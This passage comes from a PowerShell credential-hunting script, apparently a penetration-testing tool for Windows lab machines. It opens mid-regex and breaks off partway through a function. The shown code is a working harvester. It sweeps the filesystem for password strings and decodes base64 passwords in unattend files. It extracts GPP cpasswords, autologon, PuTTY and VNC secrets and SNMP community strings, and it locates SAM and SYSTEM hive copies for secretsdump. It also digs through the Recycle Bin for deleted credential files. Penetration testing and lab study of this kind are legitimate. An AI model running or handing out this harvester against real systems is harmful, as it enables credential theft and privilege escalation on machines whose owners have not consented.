    # .NET assembly identity noise: publicKeyToken="hex" / <assemblyIdentity ...>
    '|publickeytoken|assemblyidentity|<bindingRedirect|supportedRuntime' +
    # keyword = <placeholder-token at end of line> | keyword = <placeholder-word>
    '|' + $KW + $KWSUF + '[A-Za-z0-9_]*[\s' + $Q + ']*[:=][\s' + $Q + ']*' +
        '(?:' + $PH_TOKEN + '[\s' + $Q + ';,)\x60]*$|' + $PH_WORD + '(?:[^A-Za-z0-9_=]|$))' +
    # value="${...}" / value="%VAR%" etc. (XML attr form of a template)
    '|value\s*=\s*[' + $Q + '](?:\$\{[^}]*\}|%[A-Za-z_]*%|\{\{[^}]*\}\}|<%[^%]*%>)[' + $Q + '])'

# ---------------------------------------------------------------------------
# The core decision, used by every content check: does this RAW line contain a
# credential match, and survive the noise filter? One place, so the TP/FP
# fixtures exercise exactly what the scanner uses.
# ---------------------------------------------------------------------------
function Test-CredLine {
    param(
        [string] $Line,
        [string] $Pattern = $CRED_RE,
        [string] $Noise   = $NOISE_RE
    )
    if ($null -eq $Line -or $Line -eq '') { return $false }
    if ($Line -notmatch $Pattern) { return $false }
    if ($Noise -and ($Line -match $Noise)) { return $false }
    return $true
}

# Pure predicates for the live checks (no output - fixture-testable).
# Process command line carrying a cred. '-p' counts only when a VALUE follows,
# not another flag (svchost '-k Group -p -s svc' is the policy switch).
$PROC_CRED_RE = '(?:' + $CRED_RE + '|/user:|\s-p\s+[^-\s]|\s--password)'
function Test-ProcCred([string]$CommandLine) { return (Test-CredLine $CommandLine $PROC_CRED_RE) }

# Service ObjectName that is a real (non-builtin) account. Driver / filesystem
# objects ('\Driver\WudfRd') are kernel object names, not logons.
function Test-SvcAccount([string]$ObjectName) {
    if (-not $ObjectName) { return $false }
    return ($ObjectName -notmatch '^(LocalSystem|NT AUTHORITY\\|NT Service\\|LocalService|NetworkService|\\Driver\\|\\FileSystem\\)')
}

# cmdkey /list -> Target:/User: lines, minus stock targets every Windows box
# has (WindowsLive virtualapp/didlogical). A target's User: line goes with it.
function Filter-CmdkeyLines($Lines) {
    $out = @(); $skip = $false
    foreach ($l in $Lines) {
        if ($l -match 'Target:') { $skip = ($l -match 'virtualapp/didlogical') }
        if ($skip) { continue }
        if ($l -match 'Target:|User:') { $out += $l.Trim() }
    }
    return $out
}

# ===========================================================================
# SECTION 3 - FILESYSTEM WALK (pruned, single pass, reused)
# The Linux version collapsed five full-tree walks into one and cut runtime
# 310s -> 80s. PowerShell's Select-String is far slower than grep, so pruning
# matters even more here: lean on known-path checks, and sweep as little as
# possible. One warmed file list, reused by every name/extension section.
# ===========================================================================

# --- self / tool exclusion (bug class: "the script matched itself") --------
# The Linux script reported credhunt.sh and linpeas.sh as private-key files
# because they CONTAIN the search patterns. Exclude our own file (by real
# path, captured even when dot-sourced) and the common enum tools by name.
$SelfPath = ''
try {
    if ($PSCommandPath)             { $SelfPath = $PSCommandPath }
    elseif ($MyInvocation.MyCommand -and $MyInvocation.MyCommand.Path) { $SelfPath = $MyInvocation.MyCommand.Path }
} catch { }
$SelfPath = $SelfPath.ToLower()

$SELF_NAMES = @{}
foreach ($n in @(
    'credhunt.ps1','credhunt.tests.ps1','credhunt.walk.tests.ps1','credhunt.sh',
    'linpeas.sh','winpeas.ps1','winpeas.bat','winpeasany.exe','winpeasx64.exe',
    'winpeasx86.exe','winpeas_ps.ps1','privesccheck.ps1','powerup.ps1','powerview.ps1',
    'sherlock.ps1','jaws-enum.ps1','seatbelt.exe','sharpup.exe','mimikatz.exe'
)) { $SELF_NAMES[$n.ToLower()] = $true }

function Is-SelfOrTool {
    param([string]$Name,[string]$FullPath)
    $nl = $Name.ToLower()
    if ($SELF_NAMES[$nl]) { return $true }
    if ($nl -like 'credhunt*' -or $nl -like '*.tests.ps1') { return $true }   # our own files
    # common carried pentest tools - their source is full of sample creds / idioms
    if ($nl -like '*peas*' -or $nl -like '*kerberoast*' -or $nl -like '*mimikatz*' -or
        $nl -like '*sharphound*' -or $nl -like '*powerview*' -or $nl -like '*powerup*' -or
        $nl -like '*rubeus*' -or $nl -like '*seatbelt*' -or $nl -like '*privesccheck*' -or
        $nl -like '*powersploit*' -or $nl -like '*jaws*' -or $nl -eq 'get-spn.ps1' -or
        $nl -eq 'pe-audit.ps1') { return $true }
    if ($SelfPath -and $FullPath -and ($FullPath.ToLower() -eq $SelfPath)) { return $true }
    if ($script:OutFileFull -and $FullPath -and ($FullPath.ToLower() -eq $script:OutFileFull)) { return $true }
    return $false
}

# --- directory NAMES pruned wherever they appear (vendored/generated) ------
$NOISE_DIRS = @(
    'node_modules','site-packages','dist-packages','__pycache__','packages',
    'vendor','bower_components','pear','.git','.svn','.hg','.vs','.vscode','.nuget',
    '.gradle','.m2','.cargo','.rustup','.npm','.cache','obj',
    # Chromium (Edge/Chrome) component payloads: UI strings, wordlists
    'Edge Wallet','ZxcvbnData'
)
$NOISE_DIR_SET = @{}
foreach ($d in $NOISE_DIRS) { $NOISE_DIR_SET[$d.ToLower()] = $true }

# --- absolute subtrees pruned everywhere: OS component stores & app payloads.
# Huge, and admin credentials are not written into them. Everything else under
# Program Files / ProgramData IS searched (apps keep configs there). -Root
# aware via BP().
$PRUNE_PATHS = @(
    (BP 'Windows\WinSxS'), (BP 'Windows\servicing'), (BP 'Windows\assembly'),
    (BP 'Windows\Microsoft.NET'), (BP 'Windows\SoftwareDistribution'),
    (BP 'Windows\Installer'), (BP 'Windows\CSC'), (BP 'Windows\Fonts'),
    (BP 'Windows\DriverStore'), (BP 'Windows\LiveKernelReports'),
    (BP 'Windows\Logs\CBS'), (BP 'Program Files\WindowsApps'),
    (BP 'System Volume Information'),
    # $Recycle.Bin is NOT pruned - users delete sensitive files there (emails,
    # old config dumps). Scan-RecycleBin shows them with original paths.
    # vendor agent/config trees seen flooding live sweeps (no creds inside)
    (BP 'ProgramData\Microsoft\IdentityCRL'), (BP 'ProgramData\Microsoft\Windows\OneSettings'),
    (BP 'ProgramData\Amazon\SSM\Logs'), (BP 'ProgramData\Amazon\SSM\runtimeconfig')
)
$PRUNE_PATHS_LC = @(); foreach ($p in $PRUNE_PATHS) { $PRUNE_PATHS_LC += $p.ToLower() }

# --- extensions never worth reading as text during a content sweep ---------
$SKIP_EXT = @{}
foreach ($e in @(
    '.dll','.exe','.sys','.msi','.cab','.mui','.pdb','.lib','.obj','.winmd','.ocx',
    '.so','.o','.a','.class','.jar','.war','.pyc','.pyo','.mo','.nupkg','.lnk',
    '.png','.jpg','.jpeg','.gif','.bmp','.ico','.svg','.woff','.woff2','.ttf','.eot',
    '.pdf','.zip','.gz','.xz','.bz2','.7z','.rar','.vhd','.vhdx','.iso','.wim',
    '.evtx','.etl','.dmp','.mp3','.mp4','.avi','.mov','.wav','.mkv',
    # binary/resource blobs that only produce garbage matches (seen on live runs)
    '.pak','.dat','.data','.bin','.pack','.idx','.db','.sqlite','.sqlite3',
    '.mdf','.ldf','.ndf','.resources','.rll','.ttc','.otf','.cur','.icns',
    '.blob','.man','.msu','.appx','.msix','.vsix','.pma','.jfm','.chk','.otf'
)) { $SKIP_EXT[$e] = $true }

# Extensions worth reading in the generic CONTENT sweep: config/script/text only.
# Keeps Select-String off vendor binaries (speed) and off their noise (signal).
# Known-location checks still read specific files regardless of this list.
$TEXT_EXT = @{}
foreach ($e in @(
    '.txt','.ini','.cfg','.conf','.config','.xml','.json','.env','.yml','.yaml',
    '.properties','.ps1','.psm1','.psd1','.bat','.cmd','.vbs','.vbe','.js','.php',
    '.asp','.aspx','.ascx','.asax','.jsp','.py','.rb','.pl','.sh','.sql','.cnf',
    '.inf','.reg','.md','.cs','.java','.ts','.tf','.tfvars','.toml','.log','.rdp',
    '.ovpn','.pem','.key','.htpasswd','.bak','.old','.tmp','.sample','.dist','.template',
    '.eml'
)) { $TEXT_EXT[$e] = $true }
# extensionless files that are still worth sweeping
$NOEXT_OK = @{}
foreach ($n in @('id_rsa','id_dsa','id_ecdsa','id_ed25519','authorized_keys',
                 'known_hosts','credentials','.env','.pgpass','.netrc','.my.cnf')) {
    $NOEXT_OK[$n.ToLower()] = $true
}

function Is-PruneDir {
    param([string]$Name,[string]$FullPath)
    if (Is-Excluded $FullPath) { return $true }
    if ($NOISE_DIR_SET[$Name.ToLower()]) { return $true }
    $lp = $FullPath.ToLower()
    # build-output: prune ...\bin\Debug and ...\bin\Release (but not bin itself)
    if ($lp -like '*\bin\debug' -or $lp -like '*\bin\release' -or
        $lp -like '*\bin\debug\*' -or $lp -like '*\bin\release\*') { return $true }
    # browser extension code: <...\User Data>\<profile>\Extensions (Edge/Chrome/Brave)
    if ($lp -like '*\user data\*\extensions' -or $lp -like '*\user data\*\extensions\*') { return $true }
    foreach ($p in $PRUNE_PATHS_LC) {
        if ($lp -eq $p -or $lp.StartsWith($p + '\')) { return $true }
    }
    return $false
}

function Is-SkipFile {
    param([string]$Name,[int64]$Length,[string]$FullPath)
    if ($Length -gt $MaxBytes) { return $true }
    if (Is-SelfOrTool $Name $FullPath) { return $true }
    $ext = [System.IO.Path]::GetExtension($Name)
    if ($ext -and $SKIP_EXT[$ext.ToLower()]) { return $true }
    # minified / bundled / source-map web assets: vendored, generated noise
    $nl = $Name.ToLower()
    if ($nl -like '*.min.js' -or $nl -like '*.min.css' -or $nl -like '*.map' -or
        $nl -like '*.bundle.js' -or $nl -like '*-bundle*.js' -or $nl -like '*.chunk.js' -or
        $nl -like '*.pack.js' -or $nl -like '*.vendor.js') { return $true }
    return $false
}

# ---------------------------------------------------------------------------
# One explicit-stack walk. We skip prune directories BEFORE descending (the
# whole saving) and cap depth. No Get-ChildItem -Recurse (can't prune), no
# Get-ChildItem -File (not on older boxes) - we test PSIsContainer ourselves.
# Returns a flat List[string] of file full paths.
# ---------------------------------------------------------------------------
function Walk-Files {
    param([string[]]$Roots,[int]$MaxDepth = 40,[switch]$SkipBig)
    $out = New-Object System.Collections.Generic.List[string]
    $stack = New-Object System.Collections.Stack
    foreach ($r in $Roots) {
        if ($r -and (PathDir $r)) {
            $stack.Push((New-Object PSObject -Property @{ P = $r; D = 0 }))
        }
    }
    while ($stack.Count -gt 0) {
        $cur = $stack.Pop()
        $kids = $null
        try { $kids = Get-ChildItem -LiteralPath $cur.P -Force -ErrorAction SilentlyContinue }
        catch { continue }
        if (-not $kids) { continue }
        foreach ($k in $kids) {
            try {
                if ($k.PSIsContainer) {
                    # Skip reparse points (junctions / symlinks): they cause
                    # infinite-ish loops (AppData\Local\Application Data -> self,
                    # C:\Users\All Users -> ProgramData) that crawl the walk.
                    $isReparse = ($k.Attributes -band [System.IO.FileAttributes]::ReparsePoint) -ne 0
                    if ($cur.D -lt $MaxDepth -and -not $isReparse -and -not (Is-PruneDir $k.Name $k.FullName)) {
                        $stack.Push((New-Object PSObject -Property @{ P = $k.FullName; D = ($cur.D + 1) }))
                    }
                } else {
                    if ($SkipBig -and (Is-SkipFile $k.Name $k.Length $k.FullName)) { continue }
                    $out.Add($k.FullName)
                }
            } catch { }
        }
    }
    return $out
}

# ---------------------------------------------------------------------------
# One warmed list over the "admin/app writes here" roots, reused by the
# name/extension-based sections instead of re-walking the disk each time.
# ---------------------------------------------------------------------------
$script:FsFiles = $null
function Fs-Warm {
    $roots = @(
        (BP 'inetpub'), (BP 'xampp'), (BP 'wamp'), (BP 'wamp64'), (BP 'Apache24'),
        (BP 'ProgramData'), (BP 'Program Files'), (BP 'Program Files (x86)'),
        $UsersDir, (BP 'Windows\Panther'), (BP 'Windows\System32\Tasks'),
        (BP 'Windows\Temp'), (BP 'Temp'), (BP 'tools'), (BP 'scripts'),
        (BP 'Apps'), (BP 'web'), (BP 'www'), (BP 'sites'), (BP 'inetpub\wwwroot'),
        (BP 'backup'), (BP 'backups'), (BP 'temp')
    )
    $script:FsFiles = Walk-Files -Roots $roots -SkipBig
}
function Fs-Files { if ($null -eq $script:FsFiles) { @() } else { $script:FsFiles } }

# ===========================================================================
# SECTION 4 - CONTENT-GREP HELPERS
# Grep-One is the only place that reads a file for content. It mirrors the
# validated Test-CredLine decision exactly: Select-String finds pattern hits,
# then the SAME $NOISE_RE discards junk - so what the sweep reports is what the
# fixtures asserted. It also refuses the script itself, known tools, binaries
# and oversize files, so those never reach the output (bug class #4/#5).
# ===========================================================================

# Safe existence tests. Test-Path THROWS UnauthorizedAccessException on paths
# under another user's profile (not just returns false), so every guard must
# swallow it - otherwise a raw error leaks into the findings.
function PathLeaf { param([string]$p) try { return [bool](Test-Path -LiteralPath $p -PathType Leaf -ErrorAction SilentlyContinue) } catch { return $false } }
function PathDir  { param([string]$p) try { return [bool](Test-Path -LiteralPath $p -PathType Container -ErrorAction SilentlyContinue) } catch { return $false } }
function PathAny  { param([string]$p) try { return [bool](Test-Path -LiteralPath $p                     -ErrorAction SilentlyContinue) } catch { return $false } }

# Expand a path that may contain wildcards into concrete file paths.
function Resolve-Glob {
    param([string]$PathPattern)
    $res = @()
    try {
        if ($PathPattern -match '[*?]') {
            Get-ChildItem -Path $PathPattern -Force -ErrorAction SilentlyContinue |
                Where-Object { -not $_.PSIsContainer } |
                ForEach-Object { $res += $_.FullName }
        } elseif (Test-Path -LiteralPath $PathPattern -PathType Leaf) {
            $res += $PathPattern
        }
    } catch { }
    return $res
}

# Real user profile directories (skips the pseudo-profiles).
function User-Homes {
    $res = @()
    try {
        Get-ChildItem -LiteralPath $UsersDir -Force -ErrorAction SilentlyContinue |
            Where-Object { $_.PSIsContainer -and $_.Name -notmatch '^(All Users|Default User|Default|Public)$' } |
            ForEach-Object { $res += $_.FullName }
    } catch { }
    return $res
}

# Return "line#: text" for each match of $Pattern in $Path that survives $Noise.
function Grep-One {
    param([string]$Path,[string]$Pattern,[string]$Noise = $NOISE_RE)
    $res = @()
    # Belt-and-suspenders against a locked/inaccessible file (e.g. a MySQL temp
    # held exclusively, like C:\xampp\tmp\*.tmp): `trap` is a more fundamental
    # PowerShell error primitive than try/catch and intercepts ANY terminating
    # error in this function's scope, resuming at the next statement so the
    # scan never halts and nothing is printed to the console by US.
    #
    # IMPORTANT: a caught/trapped exception is STILL appended to PowerShell's
    # automatic $Error collection - that happens at throw time, independent of
    # try/catch/trap. On a host whose prompt/theme renders $Error (oh-my-posh,
    # Starship, a custom `prompt` function, PSReadLine error rendering), a
    # fully-handled skip like this can still appear as red text after the
    # command returns, even though the scan completed fine. We remove only the
    # entries we ourselves generated (via the outer finally below) so nothing
    # we handle lingers for an external renderer to pick up.
    $script:ErrCountBefore = $Error.Count
    trap { continue }
    $ErrorActionPreference = 'Stop'
    try {
    try {
        if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) { return $res }
        $fi = Get-Item -LiteralPath $Path -Force -ErrorAction Stop
        if ($fi.Length -gt $MaxBytes) { return $res }
        $ext = [System.IO.Path]::GetExtension($fi.Name)
        if ($ext -and $SKIP_EXT[$ext.ToLower()]) { return $res }
        if (Is-SelfOrTool $fi.Name $fi.FullName) { return $res }
        if (Is-Excluded $fi.FullName) { return $res }
    } catch { return $res }
    # Read it ourselves with a SHARED-read handle instead of Select-String, so a
    # file another process holds open (MySQL/Apache temp, a live log) is read
    # rather than throwing a lock error - and no per-file error ever spews. Also
    # makes the core engine PowerShell-2.0 safe (no Select-String -LiteralPath).
    $fs = $null; $sr = $null
    try {
        # Static .NET call (not New-Object): a sharing violation / access-denied
        # here throws a TERMINATING exception that the catch handles regardless
        # of $ErrorActionPreference. New-Object would raise a NON-terminating
        # error that leaks to the console when the script runs at the default
        # 'Continue'. A file opened exclusively by another process is skipped.
        $fs = [System.IO.File]::Open($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $sr = New-Object System.IO.StreamReader($fs, $true)
        $lineNo = 0
        while (-not $sr.EndOfStream) {
            $ln = $sr.ReadLine(); $lineNo++
            if ($null -eq $ln) { continue }
            if ($ln.Length -gt 1500) {
                # Too long to print whole (minified JS, a compiled blob, a
                # packed config - usually generated noise, not a secret) -
                # BUT many legitimate tools (mRemoteNG's confCons.xml is the
                # one that found this gap; the same shape applies to any
                # current or future XML/INI/JSON config that writes one
                # element as a single attribute-heavy line) bury a real
                # credential inside an otherwise-long line. Rather than drop
                # the whole line, or special-case each vendor, pull out just
                # the individual KEYWORD=value snippets that match $Pattern
                # (whatever the caller is already looking for - every known
                # form: assignment, XML attr, URI, etc.) and noise-filter
                # EACH SNIPPET on its own. This generalizes automatically: a
                # brand-new program with this same long-single-line shape is
                # caught with no new code, as long as its credential still
                # looks like one of the forms $Pattern already recognizes.
                # A hard cap keeps a truly pathological (100KB+) line cheap.
                if ($ln.Length -le 200000) {
                    $lineMatches = @([regex]::Matches($ln, $Pattern, 'IgnoreCase'))
                    # A real config writes ONE credential attribute per element
                    # (mRemoteNG: one Password= per Node line). A line with many
                    # matches is itself the signal that it's generated/repetitive
                    # noise (a minified blob with several "token"/"key"-looking
                    # property names, a templated line repeated for a test
                    # fixture) rather than a one-off secret - suppress the whole
                    # line rather than flood output with it.
                    if ($lineMatches.Count -ge 1 -and $lineMatches.Count -le 8) {
                        foreach ($am in $lineMatches) {
                            $s0 = [Math]::Max(0, $am.Index - 15)
                            $s1 = [Math]::Min($ln.Length, $am.Index + $am.Length + 15)
                            $snippet = $ln.Substring($s0, $s1 - $s0).Trim()
                            if ($snippet.Length -gt 200) { $snippet = $snippet.Substring(0, 200) + ' ...[trunc]' }
                            if ($Noise -and ($snippet -match $Noise)) { continue }
                            $res += ("{0}: ...{1}..." -f $lineNo, $snippet)
                        }
                    }
                }
                continue
            }
            if ($ln -match $Pattern) {
                if (-not ($Noise -and ($ln -match $Noise))) {
                    $res += ("{0}: {1}" -f $lineNo, $ln.Trim())
                }
            }
        }
    } catch { }
    finally {
        if ($sr) { try { $sr.Close() } catch { } }
        if ($fs) { try { $fs.Close() } catch { } }
    }
    }
    finally {
        while ($Error.Count -gt $script:ErrCountBefore) { $Error.RemoveAt(0) }
    }
    return $res
}

# Grep-Paths/Grep-Dirs/Show-File report their result via $script:LastGrepCount
# / $script:LastShowFile instead of `return <value>` - NEVER via the pipeline.
# Emit (called internally, for display) uses Write-Output, which shares the
# success/pipeline stream with whatever a function `return`s; a caller that
# captures the result (`$n = Func`) would otherwise silently absorb the
# displayed text along with the real value. Reading a side-channel script
# variable after a bare (uncaptured) call sidesteps that entirely: a bare
# call lets all the Write-Output display text flow straight to the console
# and the -OutFile tee, untouched, while the count/bool travels separately.

# Grep an explicit list of paths/globs; print a [+] header + capped matches per
# file that hits. Result in $script:LastGrepCount - see note above.
function Grep-Paths {
    param([string]$Pattern,[string[]]$Paths,[string]$Noise = $NOISE_RE,[string]$Tag = '')
    $nfiles = 0
    foreach ($pp in $Paths) {
        if (-not $pp) { continue }
        foreach ($p in (Resolve-Glob $pp)) {
            $m = Grep-One -Path $p -Pattern $Pattern -Noise $Noise
            if ($m.Count -gt 0) {
                $nfiles++
                if ($Tag) { FileHit ("$p  ($Tag)") } else { FileHit $p }
                Show-Lines $m
            }
        }
    }
    $script:LastGrepCount = $nfiles
}

# Grep an already-collected file list (e.g. the warmed Fs-Files) - the sweep.
# Result in $script:LastGrepCount - see note above.
function Grep-Dirs {
    param([string]$Pattern,[string[]]$Files,[string]$Noise = $NOISE_RE)
    $nfiles = 0
    foreach ($p in $Files) {
        $m = Grep-One -Path $p -Pattern $Pattern -Noise $Noise
        if ($m.Count -gt 0) { $nfiles++; FileHit $p; Show-Lines $m }
    }
    $script:LastGrepCount = $nfiles
}

# Dump the first N lines of a file we always want to eyeball (answer files,
# histories, task XML). Bounded by Show-Lines. Result in $script:LastShowFile.
function Show-File {
    param([string]$Path,[int]$Lines = 20,[string]$Tag = '')
    try {
        if (-not (Test-Path -LiteralPath $Path -PathType Leaf)) { $script:LastShowFile = $false; return }
        $fi = Get-Item -LiteralPath $Path -Force -ErrorAction Stop
        if (Is-SelfOrTool $fi.Name $fi.FullName) { $script:LastShowFile = $false; return }
        if (Is-Excluded $fi.FullName) { $script:LastShowFile = $false; return }
    } catch { $script:LastShowFile = $false; return }
    if ($Tag) { FileHit ("$Path  ($Tag)") } else { FileHit $Path }
    try {
        $content = Get-Content -LiteralPath $Path -TotalCount $Lines -ErrorAction SilentlyContinue
        $out = @(); $i = 0
        foreach ($c in $content) { $i++; $out += ("{0}: {1}" -f $i, $c) }
        Show-Lines $out
    } catch { }
    $script:LastShowFile = $true
}

# ===========================================================================
# SECTION 5 - KNOWN-LOCATION CHECKS (the high-yield layer)
# ~200 paths opened directly, no searching. On lab boxes the credential is
# usually in a predictable place, and these cost nothing when absent.
# ===========================================================================

# Safe registry value read (live hive only). $null when absent/unreadable.
function Reg-Get {
    param([string]$Path,[string]$Name)
    try {
        $v = Get-ItemProperty -LiteralPath $Path -Name $Name -ErrorAction SilentlyContinue
        if ($null -ne $v) { return $v.$Name }
    } catch { }
    return $null
}

# --- answer / sysprep / unattend files -------------------------------------
function Scan-Answerfiles {
    Sect 'Answer / unattend / sysprep files'
    $names = @('Unattend.xml','Autounattend.xml','unattended.xml','sysprep.xml','sysprep.inf','unattend.txt')
    $dirs  = @(
        (BP '\'), (BP 'Windows\Panther'), (BP 'Windows\Panther\Unattend'),
        (BP 'Windows\System32\Sysprep'), (BP 'Windows\System32\Sysprep\Panther'),
        (BP 'Windows\System32'), (BP 'Windows')
    )
    $found = 0
    foreach ($d in $dirs) {
        foreach ($n in $names) {
            $p = Join-Path $d $n
            if (PathLeaf $p) {
                $found++
                Show-File $p 80 'answer file'
                # surface <Password>/<Value> explicitly and try to decode base64
                try {
                    $txt = Get-Content -LiteralPath $p -Raw -ErrorAction SilentlyContinue
                    $rx = [regex]'(?is)<Value>([A-Za-z0-9+/=]{8,})</Value>'
                    foreach ($mm in $rx.Matches($txt)) {
                        $b64 = $mm.Groups[1].Value
                        try {
                            $raw = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($b64))
                            # unattend appends the literal "Password" before encoding - strip it
                            $dec = $raw -replace 'Password$',''
                            if ($dec) { Val "unattend <Value> base64 decodes to: $dec" }
                        } catch { }
                    }
                } catch { }
            }
        }
    }
    if (-not $found) { Note 'no answer files found' }
}

# --- Group Policy Preferences cpassword (MS14-025) -------------------------
function Scan-GPP {
    Sect 'Group Policy Preferences (cpassword)'
    $roots = @(
        (BP 'ProgramData\Microsoft\Group Policy\History'),
        (BP 'Windows\SYSVOL\sysvol'), (BP 'Windows\SYSVOL\domain'),
        (BP 'Windows\System32\GroupPolicy')
    )
    $names = @('Groups.xml','Services.xml','ScheduledTasks.xml','DataSources.xml','Printers.xml','Drives.xml')
    $found = 0
    foreach ($r in $roots) {
        if (-not (PathDir $r)) { continue }
        foreach ($f in (Walk-Files -Roots @($r))) {
            if ($names -contains (Split-Path $f -Leaf)) {
                $m = Grep-One -Path $f -Pattern $CPASSWORD -Noise $null
                if ($m.Count -gt 0) {
                    Crit "GPP cpassword in $f  (gpp-decrypt - the AES key is public)"
                    Show-Lines $m; $found++
                }
            }
        }
    }
    if (-not $found) { Note 'no GPP cpassword found' }
}

# --- registry credentials (live hive only) ---------------------------------
function Scan-Registry {
    Sect 'Registry credentials'
    if ($IsOffline) { Note 'skipped (offline -Root scan - load the NTUSER/SOFTWARE hive manually)'; return }

    # Winlogon autologon
    $wl = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
    $du = Reg-Get $wl 'DefaultUserName'; $dp = Reg-Get $wl 'DefaultPassword'
    $aal = Reg-Get $wl 'AutoAdminLogon'; $dd = Reg-Get $wl 'DefaultDomainName'
    if ($dp) {
        Crit 'Winlogon DefaultPassword set'
        $who = if ($dd) { "$dd\$du" } else { $du }
        NoteW "user: $who"
        NoteW "AutoAdminLogon: $aal"
        Val "password: $dp"
    }
    elseif ($du -and "$aal" -eq '1') { FileHit "Winlogon autologon enabled (user=$du) - no DefaultPassword value stored" }

    # PuTTY sessions (current user hive; other users need their NTUSER.DAT loaded)
    $puttyBase = 'HKCU:\Software\SimonTatham\PuTTY\Sessions'
    if (PathAny $puttyBase) {
        foreach ($s in (Get-ChildItem -LiteralPath $puttyBase -ErrorAction SilentlyContinue)) {
            $pu = Reg-Get $s.PSPath 'ProxyUsername'; $pp = Reg-Get $s.PSPath 'ProxyPassword'
            $hn = Reg-Get $s.PSPath 'HostName'
            if ($pp) { Val "PuTTY session '$($s.PSChildName)' ($hn) ProxyUsername=$pu ProxyPassword=$pp" }
        }
    }

    # VNC password blobs (report raw bytes; do not decrypt)
    $vncKeys = @(
        'HKLM:\SOFTWARE\RealVNC\WinVNC4','HKLM:\SOFTWARE\RealVNC\vncserver',
        'HKLM:\SOFTWARE\TightVNC\Server','HKLM:\SOFTWARE\ORL\WinVNC3',
        'HKCU:\Software\ORL\WinVNC3','HKLM:\SOFTWARE\TigerVNC\WinVNC4',
        'HKLM:\SOFTWARE\Wow6432Node\TightVNC\Server'
    )
    foreach ($k in $vncKeys) {
        foreach ($vn in @('Password','PasswordViewOnly','ControlPassword')) {
            $pv = Reg-Get $k $vn
            if ($pv) {
                $hex = ($pv | ForEach-Object { '{0:x2}' -f $_ }) -join ''
                Val "VNC $vn in $k = $hex  (vncpwd / fixed DES key)"
            }
        }
    }

    # SNMP community strings
    $snmp = 'HKLM:\SYSTEM\CurrentControlSet\Services\SNMP\Parameters\ValidCommunities'
    if (PathAny $snmp) {
        try {
            $props = Get-ItemProperty -LiteralPath $snmp -ErrorAction SilentlyContinue
            foreach ($p in $props.PSObject.Properties) {
                if ($p.Name -notmatch '^PS') { Val "SNMP community string: $($p.Name)" }
            }
        } catch { }
    }

    # Services running as a named (non-builtin) account
    $svc = 'HKLM:\SYSTEM\CurrentControlSet\Services'
    if (PathAny $svc) {
        foreach ($s in (Get-ChildItem -LiteralPath $svc -ErrorAction SilentlyContinue)) {
            $on = Reg-Get $s.PSPath 'ObjectName'
            if (Test-SvcAccount $on) {
                FileHit "service $($s.PSChildName) runs as '$on'"
            }
        }
    }
}

# --- SAM / SYSTEM / SECURITY hive copies (locate only) ---------------------
function Scan-Hives {
    Sect 'SAM / SYSTEM / SECURITY hive copies'
    $cands = @()
    foreach ($h in @('SAM','SYSTEM','SECURITY')) {
        $cands += (BP "Windows\repair\$h")
        $cands += (BP "Windows\System32\config\RegBack\$h")
        $cands += (BP "Windows\Temp\$h")
        $cands += (BP "Temp\$h")
        $cands += (BP "$h")
    }
    $found = 0
    foreach ($c in $cands) {
        if (PathLeaf $c) {
            $sz = 0; try { $sz = (Get-Item -LiteralPath $c -Force).Length } catch { }
            if ($sz -gt 0) {
                Crit ("hive copy {0}  ({1:N0} KB)  - copy off and run secretsdump.py LOCAL" -f $c, ($sz/1KB))
                $found++
            }
        }
    }
    if (-not $found) { Note 'no readable SAM/SYSTEM/SECURITY copies (RegBack is 0-byte on modern Windows)' }
}

# Filter the warmed file list by leaf-name wildcard(s). Reuses the single walk.
function Fs-ByName {
    param([string[]]$Patterns)
    $res = @()
    foreach ($f in (Fs-Files)) {
        $leaf = Split-Path $f -Leaf
        foreach ($pat in $Patterns) { if ($leaf -like $pat) { $res += $f; break } }
    }
    return $res
}

# --- command history / transcripts / stored creds --------------------------
# ---------------------------------------------------------------------------
# $Recycle.Bin layout, per user: $Recycle.Bin\<SID>\
#   $Ixxxxxx.<ext>  metadata (original path, size, delete time)
#   $Rxxxxxx.<ext>  the content, original extension preserved
# $I format:
#   [0..7]   header; 1 (pre-Win10) or 2 (Win10+)
#   [8..15]  original file size (int64)
#   [16..23] delete time (FILETIME)
#   v1: [24..543]  520-byte UTF-16LE path, null-terminated
#   v2: [24..27]   int32 path length in chars (inc null), [28..] UTF-16LE path
# ---------------------------------------------------------------------------
function Read-RecycleIFile {
    param([string]$Path)
    $r = @{ OriginalPath = ''; DeletedUtc = $null; OriginalSize = 0 }
    try {
        $b = [System.IO.File]::ReadAllBytes($Path)
        if ($b.Length -lt 24) { return $r }
        $ver = [BitConverter]::ToInt64($b,0)
        $r.OriginalSize = [BitConverter]::ToInt64($b,8)
        try { $r.DeletedUtc = [DateTime]::FromFileTimeUtc([BitConverter]::ToInt64($b,16)) } catch { }
        if ($ver -eq 2 -and $b.Length -ge 28) {
            $chars = [BitConverter]::ToInt32($b,24)
            $byteLen = ($chars * 2) - 2  # drop trailing null
            if ($byteLen -lt 0 -or (28 + $byteLen) -gt $b.Length) { return $r }
            $r.OriginalPath = [System.Text.Encoding]::Unicode.GetString($b, 28, $byteLen)
        } else {
            $end = [Math]::Min(544, $b.Length)
            $s = [System.Text.Encoding]::Unicode.GetString($b, 24, $end - 24)
            $nul = $s.IndexOf([char]0)
            if ($nul -ge 0) { $s = $s.Substring(0,$nul) }
            $r.OriginalPath = $s
        }
    } catch { }
    return $r
}

# Deleted file whose original name/extension looks interesting even without
# a content hit. Keep this list tight - the content grep is the primary signal.
$RBIN_LOOT_RE = '(?i)^(?:\$R[0-9A-Z]{6,}\.)?(?:' +
    'password|cred|secret|vault|apikey|api_key|login|logins|accounts?|' +
    'backup|dump|export|notes|todo|readme|handover|handoff' +
    ')[^\\]*$'
$RBIN_LOOT_EXT = @{}
foreach ($e in @('.eml','.msg','.kdbx','.kdb','.pfx','.p12','.jks','.ppk',
                 '.ovpn','.rdp','.config','.ini','.cfg','.conf','.env',
                 '.sql','.ps1','.bat','.cmd','.vbs','.txt','.rtf','.docx',
                 '.xlsx','.csv','.log','.bak','.old','.1','.key','.pem')) {
    $RBIN_LOOT_EXT[$e] = $true
}

function Scan-RecycleBin {
    Sect 'Recycle Bin (deleted files per user, with original paths)'
    $rb = BP '$Recycle.Bin'
    if (-not (Test-Path -LiteralPath $rb -ErrorAction SilentlyContinue)) {
        Note 'no $Recycle.Bin present'; return
    }
    $any = $false
